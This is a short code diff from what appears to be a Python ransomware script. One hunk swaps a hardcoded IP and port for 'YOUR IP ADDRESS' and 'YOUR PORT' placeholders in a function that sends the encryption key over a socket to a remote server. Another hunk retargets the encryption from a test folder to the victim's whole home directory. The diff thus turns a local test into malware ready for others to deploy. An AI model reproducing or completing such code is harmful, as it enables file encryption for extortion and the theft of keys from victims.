@@ -9,8 +9,8 @@ from Crypto.Util.Padding import pad
 
 # We create a socket to send the encryption key to a remote server
 def send_key(key):
-    host = "192.168.0.155"
-    port = 8092
+    host = "YOUR IP ADDRESS"
+    port = YOUR PORT
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     s.send(key)
@@ -62,4 +62,4 @@ if __name__ == "__main__":
     elif platform.system == "Darwin":
         path = '/Users/' + username
     
-    encrypt_whole("/home/hellisabove/test", "hellisabove")
+    encrypt_whole(path, "password")
